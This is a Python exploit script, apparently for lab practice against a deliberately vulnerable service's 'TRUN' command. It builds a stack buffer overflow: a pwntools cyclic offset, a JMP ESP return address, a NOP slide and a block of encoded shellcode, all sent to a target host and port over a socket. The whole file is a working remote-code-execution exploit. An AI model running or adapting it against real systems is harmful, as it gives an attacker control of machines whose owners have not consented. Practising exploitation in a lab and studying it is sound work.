import pwn
import struct
import socket


def exploit(host, port, fuzzsize, eip, jmpesp):
    offset = pwn.cyclic_metasploit_find(
        int(
            "0x" + eip, 16
        )
    )

    jmpesp = int(
        "0x" + jmpesp, 16
    )

    neweip = struct.pack("<I", jmpesp)

    nopslide = b"\x90" * 10

    payload = b""
    payload += b"\xbb\x82\x18\x2f\x1a\xdb\xdd\xd9\x74\x24\xf4\x5e"
    payload += b"\x31\xc9\xb1\x52\x83\xee\xfc\x31\x5e\x0e\x03\xdc"
    payload += b"\x16\xcd\xef\x1c\xce\x93\x10\xdc\x0f\xf4\x99\x39"
    payload += b"\x3e\x34\xfd\x4a\x11\x84\x75\x1e\x9e\x6f\xdb\x8a"
    payload += b"\x15\x1d\xf4\xbd\x9e\xa8\x22\xf0\x1f\x80\x17\x93"
    payload += b"\xa3\xdb\x4b\x73\x9d\x13\x9e\x72\xda\x4e\x53\x26"
    payload += b"\xb3\x05\xc6\xd6\xb0\x50\xdb\x5d\x8a\x75\x5b\x82"
    payload += b"\x5b\x77\x4a\x15\xd7\x2e\x4c\x94\x34\x5b\xc5\x8e"
    payload += b"\x59\x66\x9f\x25\xa9\x1c\x1e\xef\xe3\xdd\x8d\xce"
    payload += b"\xcb\x2f\xcf\x17\xeb\xcf\xba\x61\x0f\x6d\xbd\xb6"
    payload += b"\x6d\xa9\x48\x2c\xd5\x3a\xea\x88\xe7\xef\x6d\x5b"
    payload += b"\xeb\x44\xf9\x03\xe8\x5b\x2e\x38\x14\xd7\xd1\xee"
    payload += b"\x9c\xa3\xf5\x2a\xc4\x70\x97\x6b\xa0\xd7\xa8\x6b"
    payload += b"\x0b\x87\x0c\xe0\xa6\xdc\x3c\xab\xae\x11\x0d\x53"
    payload += b"\x2f\x3e\x06\x20\x1d\xe1\xbc\xae\x2d\x6a\x1b\x29"
    payload += b"\x51\x41\xdb\xa5\xac\x6a\x1c\xec\x6a\x3e\x4c\x86"
    payload += b"\x5b\x3f\x07\x56\x63\xea\x88\x06\xcb\x45\x69\xf6"
    payload += b"\xab\x35\x01\x1c\x24\x69\x31\x1f\xee\x02\xd8\xda"
    payload += b"\x79\xed\xb5\xfb\x78\x85\xc7\x03\x60\x6c\x41\xe5"
    payload += b"\xfc\x9e\x07\xbe\x68\x06\x02\x34\x08\xc7\x98\x31"
    payload += b"\x0a\x43\x2f\xc6\xc5\xa4\x5a\xd4\xb2\x44\x11\x86"
    payload += b"\x15\x5a\x8f\xae\xfa\xc9\x54\x2e\x74\xf2\xc2\x79"
    payload += b"\xd1\xc4\x1a\xef\xcf\x7f\xb5\x0d\x12\x19\xfe\x95"
    payload += b"\xc9\xda\x01\x14\x9f\x67\x26\x06\x59\x67\x62\x72"
    payload += b"\x35\x3e\x3c\x2c\xf3\xe8\x8e\x86\xad\x47\x59\x4e"
    payload += b"\x2b\xa4\x5a\x08\x34\xe1\x2c\xf4\x85\x5c\x69\x0b"
    payload += b"\x29\x09\x7d\x74\x57\xa9\x82\xaf\xd3\xd9\xc8\xed"
    payload += b"\x72\x72\x95\x64\xc7\x1f\x26\x53\x04\x26\xa5\x51"
    payload += b"\xf5\xdd\xb5\x10\xf0\x9a\x71\xc9\x88\xb3\x17\xed"
    payload += b"\x3f\xb3\x3d"

    try:
        buffer = b"".join([
            b"TRUN",
            b" ",
            b"/.:/",
            b"A" * offset,
            neweip,
            nopslide,
            payload,
            b"C" * (fuzzsize - offset - len(neweip) - len(nopslide) - len(payload))
        ])

        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )
        sock.settimeout(1)

        sock.connect((host, port))

        sock.send(buffer)
        print(
            "Transmitting {} bytes: {}".format(len(buffer), buffer)
        )

        sock.recv(1024)
        sock.close()

    except socket.error:
        print("Couldn't connect to socket")
